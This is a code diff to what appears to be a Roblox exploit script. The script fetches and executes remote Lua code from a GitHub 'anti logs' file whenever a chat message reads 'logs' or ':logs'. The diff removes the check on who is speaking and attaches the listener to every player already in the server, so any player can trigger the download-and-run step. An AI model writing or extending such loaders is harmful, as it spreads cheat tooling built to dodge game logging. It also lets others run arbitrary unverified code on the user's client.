@@ -8,10 +8,10 @@ local function executeLoadstring(loadstringCode)
     end
 end
 
-local function handleCommand(message, speaker)
+local function handleCommand(message)
     local lowercaseMessage = string.lower(message)
 
-    if lowercaseMessage == "logs" or lowercaseMessage == ":logs" and speaker.Name ~= game.Players.LocalPlayer.Name then
+    if lowercaseMessage == "logs" or lowercaseMessage == ":logs" then
         local loadstringCode = "loadstring(game:HttpGet('https://raw.githubusercontent.com/DIZZYTHELEGEND/Zmod/main/anti%20logs'))()"
         executeLoadstring(loadstringCode)
     end
@@ -19,7 +19,13 @@ end
 
 game.Players.PlayerAdded:Connect(function(player)
     player.Chatted:Connect(function(message)
-        handleCommand(message, player)
+        handleCommand(message)
     end)
 end)
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        handleCommand(message)
+    end)
+end
 
